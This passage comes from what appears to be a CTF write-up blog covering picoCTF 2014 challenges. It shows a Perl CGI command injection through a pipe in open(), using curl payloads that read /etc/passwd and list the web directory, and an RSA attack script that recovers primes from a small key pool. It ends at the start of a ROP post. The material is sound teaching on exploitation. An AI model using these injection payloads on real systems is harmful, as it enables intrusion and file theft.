</span><span class='line'>    <span class="nb">read</span><span class="p">(</span><span class="n">NOSE</span><span class="p">,</span><span class="nv">$noseb</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="nb">read</span><span class="p">(</span><span class="n">MOUTH</span><span class="p">,</span><span class="nv">$mouthb</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="nb">read</span><span class="p">(</span><span class="n">EYES</span><span class="p">,</span><span class="nv">$eyesb</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="k">print</span> <span class="p">(</span><span class="nb">chr</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$headb</span><span class="p">)</span><span class="o">&amp;</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$hairb</span><span class="p">)</span><span class="o">&amp;</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$noseb</span><span class="p">)</span><span class="o">&amp;</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$mouthb</span><span class="p">)</span><span class="o">&amp;</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$eyesb</span><span class="p">)));</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="k">else</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">print</span> <span class="nv">$q</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">;</span>
</span><span class='line'>  <span class="o">...</span><span class="n">generate</span> <span class="n">page</span><span class="o">...</span>
</span></code></pre></td></tr></table></div></figure>


<p>We can&rsquo;t really inject anything into the parameter fields, as the value is concatenated with &ldquo;head&rdquo;, &ldquo;hair&rdquo;, etc. No calls to <code>system</code> or <code>eval</code> are made, no backticks were used. However, perl being perl, has another <a href="http://www.cgisecurity.com/lib/sips.html">trick up it&rsquo;s sleeve</a>:</p>

<p><code>
If the filename begins with "|", the filename is interpreted as a command to which output is to be piped, and if the filename ends with a "|", the filename is interpreted as a command which pipes output to us.
</code></p>

<p>That&rsquo;s handy! Let&rsquo;s try it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>curl <span class="s2">&quot;http://makeaface.picoctf.com/index.cgi?Head=%20/etc/passwd|&amp;Hair=1.bmp&amp;Nose=2.bmp&amp;Mouth=2.bmp&amp;Eyes=3.bmp&quot;</span>
</span><span class='line'>BM....binnologin
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span><span class='line'>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span><span class='line'>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span><span class='line'>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></code></pre></td></tr></table></div></figure>


<p>It returns a few lines of /etc/passwd, albeit mangled a bit. This works, because the &ldquo;head&rdquo; parameter is used in the open statement like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="nb">open</span><span class="p">(</span><span class="n">HEAD</span><span class="p">,</span><span class="s">&quot;head /etc/passwd|&quot;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>This makes perl believe that it is a command from which we want to see output! From here, we enumerated the webdirectory and Swappage came up with the brilliant solution:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>curl <span class="s2">&quot;http://makeaface.picoctf.com/index.cgi?Head=%20|cat%20/etc/passwd%26%26ls%20-la|&amp;Hair=1.bmp&amp;Nose=2.bmp&amp;Mouth=2.bmp&amp;Eyes=3.bmp&quot;</span>
</span><span class='line'>BM...hex bytes...binnologin
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span><span class='line'>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span><span class='line'>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span><span class='line'>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span><span class='line'>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span><span class='line'>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:
</span><span class='line'>syslog:x:101:104::/home/syslog:/bin/false
</span><span class='line'>messagebus:x:102:106::/var/run/dbus:/bin/false
</span><span class='line'>landscape:x:103:109::/var/lib/landscape:/bin/false
</span><span class='line'>sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>pollinate:x:105:1::/var/cache/pollinate:/bin/false
</span><span class='line'>ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
</span><span class='line'>total 228
</span><span class='line'>drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Oct <span class="m">27</span> 03:57 .
</span><span class='line'>drwxr-xr-x <span class="m">3</span> root root <span class="m">4096</span> Oct <span class="m">27</span> 03:47 ..
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root   <span class="m">34</span> Oct <span class="m">27</span> 03:48 SECRET_KEY_2b609783951a8665d8c67d721b52b0f8
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root  <span class="m">452</span> Oct <span class="m">27</span> 03:48 css.css
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root <span class="m">8338</span> Oct <span class="m">27</span> 03:48 eyes1.bmp
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root <span class="m">8338</span> Oct <span class="m">27</span> 03:48 eyes2.bmp
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root <span class="m">8338</span> Oct <span class="m">27</span> 03:48 eyes3.bmp
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root <span class="m">8338</span> Oct <span class="m">27</span> 03:48 eyes4.bmp
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root <span class="m">8338</span> Oct <span class="m">27</span> 03:48 hair0.bmp
</span></code></pre></td></tr></table></div></figure>


<p>Because that file, <code>SECRET_KEY_2b609783951a8665d8c67d721b52b0f8</code> is world-readable and in the webdirectory, we could just browse to it and grab the flag: <code>why_did_we_stop_using_perl_again?</code></p>

<h1>Low Entropy (110 points)</h1>

<p>We are given a server to connect to and a pcap file. We need to decrypt the message found in the pcap file. This message was encoded with a private RSA key.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Welcome to the Thyrin drop box. Please send your public key and message.
</span><span class='line'>Public key: c20a1d8b3903e1864d14a4d1f32ce57e4665fc5683960d2f7c0f30d5d247f5fa264fa66b49e801943ab68be3d9a4b393ae22963888bf145f07101616e62e0db2b04644524516c966d8923acf12af049a1d9d6fe3e786763613ee9b8f541291dcf8f0ac9dccc5d47565ef332d466bc80dc5763f1b1139f14d3c0bae072725815f
</span><span class='line'>Message: 49f573321bdb3ad0a78f0e0c7cd4f4aa2a6d5911c90540ddbbaf067c6aabaccde78c8ff70c5a4abe7d4efa19074a5249b2e6525a0168c0c49535bc993efb7e2c221f4f349a014477d4134f03413fd7241303e634499313034dbb4ac96606faed5de01e784f2706e85bf3e814f5f88027b8aeccf18c928821c9d2d830b5050a1e
</span></code></pre></td></tr></table></div></figure>


<p>The server spits out the product of two primes, which gives us a lot of possible public keys. We need to find the factors <code>p</code> and <code>q</code>, the factors of the captured public key. If we have those factors, it&rsquo;s game over. Luckily, the server has only 30 primes to choose from. That means that there are 30 * 29 / 2 = 435 possible keys. Let&rsquo;s first grab all these products of <code>p</code> and <code>q</code> and store them:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="k">while</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">products</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">30</span><span class="o">*</span><span class="mi">29</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;vuln2014.picoctf.com&#39;</span><span class="p">,</span><span class="mi">51818</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># banner</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">pq</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'>  <span class="n">pq</span> <span class="o">=</span> <span class="nb">long</span><span class="p">(</span><span class="s">&quot;0&quot;</span><span class="o">+</span><span class="n">pq</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="k">if</span> <span class="n">pq</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">pq</span> <span class="ow">in</span> <span class="n">products</span><span class="p">:</span>
</span><span class='line'>      <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;public_keys&#39;</span><span class="p">,</span> <span class="s">&#39;a&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span><span class='line'>          <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">pq</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>              
</span><span class='line'>      <span class="n">products</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">pq</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;Now at {} products...&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">products</span><span class="p">))</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>This should grab the 435 unique public keys. Next, we need to find the primes that constitute the captured public key. Basically, we have a list of <code>a1*a2, a1*a3, a2*a3...</code> for 30 unique primes. Let&rsquo;s assume the captured public key is derived from the values <code>a1</code> and <code>a2</code>. Given a large list of other values ax*ay and some math, we can say that there are values that satisfy:</p>

<p><code>
(a1*a2 / (a1*a3) * a2*a3 == a2*a2
</code></p>

<p>Therefore, we can extract the squared values of each prime! I skipped using <code>math.sqrt()</code> and python <code>float</code> values, as these do not have the required precision given these extremely large numbers. Let&rsquo;s generate all these squared values from each key we got from the server. Then, divide the square of the public key by each entry. If the result is also in the list of squared primes, then we have a match!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;public_keys&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
</span><span class='line'>  <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>  
</span><span class='line'><span class="n">alice_key</span> <span class="o">=</span> <span class="mh">0xc20a1d8b3903e1864d14a4d1f32ce57e4665fc5683960d2f7c0f30d5d247f5fa264fa66b49e801943ab68be3d9a4b393ae22963888bf145f07101616e62e0db2b04644524516c966d8923acf12af049a1d9d6fe3e786763613ee9b8f541291dcf8f0ac9dccc5d47565ef332d466bc80dc5763f1b1139f14d3c0bae072725815f</span>
</span><span class='line'>
</span><span class='line'><span class="n">public_keys</span> <span class="o">=</span> <span class="nb">set</span><span class="p">([])</span>
</span><span class='line'><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()):</span>
</span><span class='line'>      <span class="n">public_keys</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()))</span>
</span><span class='line'>  
</span><span class='line'><span class="n">squares</span> <span class="o">=</span> <span class="nb">set</span><span class="p">([])</span>    <span class="c"># sets are fast :)</span>
</span><span class='line'><span class="k">for</span> <span class="n">key_a</span> <span class="ow">in</span> <span class="n">public_keys</span><span class="p">:</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">key_b</span> <span class="ow">in</span> <span class="n">public_keys</span> <span class="o">-</span> <span class="nb">set</span><span class="p">([</span><span class="n">key_a</span><span class="p">]):</span>
</span><span class='line'>      <span class="n">squares</span><span class="o">.</span><span class="n">add</span><span class="p">((</span><span class="n">alice_key</span> <span class="o">*</span> <span class="n">key_a</span><span class="p">)</span> <span class="o">/</span> <span class="n">key_b</span><span class="p">)</span>
</span><span class='line'>      
</span><span class='line'><span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">squares</span><span class="p">:</span>
</span><span class='line'>  <span class="n">l</span> <span class="o">=</span> <span class="n">alice_key</span><span class="o">**</span><span class="mi">2</span> <span class="o">/</span> <span class="n">k</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">squares</span><span class="p">:</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">alice_key</span><span class="o">**</span><span class="mi">2</span> <span class="o">==</span> <span class="n">l</span><span class="o">*</span><span class="n">k</span><span class="p">:</span> <span class="c"># double-check to prevent rounding errors</span>
</span><span class='line'>          <span class="k">print</span> <span class="s">&quot;[!] Found k={}</span><span class="se">\n</span><span class="s">l={}</span><span class="se">\n</span><span class="s">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">l</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>It should return two values for k and l (because k could be l and vice-versa):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>!<span class="o">]</span> Found <span class="nv">k</span><span class="o">=</span>145636797632612493383437910621935492258871220486831431433846443881029756884131014317442568196356163696603884037401628766885574744524908524694664229202327755975190209777333222305357215356711196812874146485202755534755335009504417851499146840024376285929565498060947342673068738915934424594894642178132393803401
</span><span class='line'><span class="nv">l</span><span class="o">=</span>127485391417645634265899520100348459764415230949848696681516013917289651283750339673156991958225605417057264644648275442237083380079695308054967054357615028357457990698626856902554884944611614631356998904650004684028810140797701724207511157802310732003918967758266191880635014381653257954124503965122532941561
</span></code></pre></td></tr></table></div></figure>


<p>Now, all we have to do is take the square root of these values to get <code>p</code> and <code>q</code>! Luckily, <a href="http://stackoverflow.com/questions/15390807/integer-square-root-in-python/15391420#15391420">Newton&rsquo;s algorithm</a> works perfectly for integers. The server gave us the public exponent (2<sup>16</sup>+1) so we are all set for decrypting the message:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">isqrt</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span><span class='line'>    <span class="n">x</span> <span class="o">=</span> <span class="n">n</span>
</span><span class='line'>    <span class="n">y</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span><span class='line'>    <span class="k">while</span> <span class="n">y</span> <span class="o">&lt;</span> <span class="n">x</span><span class="p">:</span>
</span><span class='line'>        <span class="n">x</span> <span class="o">=</span> <span class="n">y</span>
</span><span class='line'>        <span class="n">y</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="n">n</span> <span class="o">//</span> <span class="n">x</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">x</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>      <span class="k">return</span> <span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
</span><span class='line'>      <span class="n">g</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">x</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">b</span> <span class="o">%</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">)</span>
</span><span class='line'>      <span class="k">return</span> <span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="n">x</span> <span class="o">-</span> <span class="p">(</span><span class="n">b</span> <span class="o">//</span> <span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="n">y</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">modinv</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">):</span>
</span><span class='line'>  <span class="n">g</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">g</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>      <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;modular inverse does not exist&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
</span><span class='line'>      <span class="k">return</span> <span class="n">x</span> <span class="o">%</span> <span class="n">m</span>
</span><span class='line'>      
</span><span class='line'><span class="n">e</span> <span class="o">=</span> <span class="mi">2</span><span class="o">**</span><span class="mi">16</span><span class="o">+</span><span class="mi">1</span>
</span><span class='line'><span class="n">k</span> <span class="o">=</span> <span class="mi">127485391417645634265899520100348459764415230949848696681516013917289651283750339673156991958225605417057264644648275442237083380079695308054967054357615028357457990698626856902554884944611614631356998904650004684028810140797701724207511157802310732003918967758266191880635014381653257954124503965122532941561</span>
</span><span class='line'><span class="n">l</span> <span class="o">=</span> <span class="mi">145636797632612493383437910621935492258871220486831431433846443881029756884131014317442568196356163696603884037401628766885574744524908524694664229202327755975190209777333222305357215356711196812874146485202755534755335009504417851499146840024376285929565498060947342673068738915934424594894642178132393803401</span>
</span><span class='line'>
</span><span class='line'><span class="n">p</span> <span class="o">=</span> <span class="n">isqrt</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
</span><span class='line'><span class="n">q</span> <span class="o">=</span> <span class="n">isqrt</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
</span><span class='line'><span class="n">c</span> <span class="o">=</span> <span class="mh">0x49f573321bdb3ad0a78f0e0c7cd4f4aa2a6d5911c90540ddbbaf067c6aabaccde78c8ff70c5a4abe7d4efa19074a5249b2e6525a0168c0c49535bc993efb7e2c221f4f349a014477d4134f03413fd7241303e634499313034dbb4ac96606faed5de01e784f2706e85bf3e814f5f88027b8aeccf18c928821c9d2d830b5050a1e</span>
</span><span class='line'>
</span><span class='line'><span class="n">n</span> <span class="o">=</span> <span class="n">p</span><span class="o">*</span><span class="n">q</span>
</span><span class='line'><span class="n">tot</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">q</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'><span class="n">d</span> <span class="o">=</span> <span class="n">modinv</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">tot</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">m</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This gives us the decoded hexadecimal representation of the message. Running it through <code>xxd</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/picoctf/low_entropy<span class="nv">$ </span>python solve.py
</span><span class='line'>0x476f6f64207468696e67206e6f206f6e652063616e207265616420746869732120492764206861746520666f72207468656d20746f206b6e6f7720746861742074686520666c6167206973206d616b655f737572655f796f75725f726e675f67656e6572617465735f6c6f7473615f7072696d65732eL
</span><span class='line'>bas@tritonal:~/tmp/picoctf/low_entropy<span class="nv">$ </span>xxd -r -p
</span><span class='line'>476f6f64207468696e67206e6f206f6e652063616e207265616420746869732120492764206861746520666f72207468656d20746f206b6e6f7720746861742074686520666c6167206973206d616b655f737572655f796f75725f726e675f67656e6572617465735f6c6f7473615f7072696d65732e
</span><span class='line'>Good thing no one can <span class="nb">read </span>this! I<span class="err">&#39;</span>d hate <span class="k">for</span> them to know that the flag is make_sure_your_rng_generates_lotsa_primes.
</span></code></pre></td></tr></table></div></figure>


<p>The flag is <code>make_sure_your_rng_generates_lotsa_primes</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Picoctf Hardcore ROP]]></title>
    <link href="http://barrebas.github.io/blog/2014/10/30/picoctf-hardcore-rop/"/>
    <updated>2014-10-30T11:33:40+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/10/30/picoctf-hardcore-rop</id>
    <content type="html"><![CDATA[<p>Our team, <a href="https://ctf-team.vulnhub.com">vulnhub-ctf</a>, joined <code>picoctf</code> to improve our skills and learn a thing or two. There were many challenges, among which a few &ldquo;Master Challenges&rdquo; worth 200 points. This is a story of how we tackled <code>hardcore_rop</code>. The challenge promises ASLR, NX, PIE and what-have-you, so let&rsquo;s get cracking!</p>

<!--more-->


<p>Upon inspecting the source of code of this weird program, we see the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">randop</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">munmap</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="mh">0x0F000000</span><span class="p">,</span> <span class="n">MAPLEN</span><span class="p">);</span>
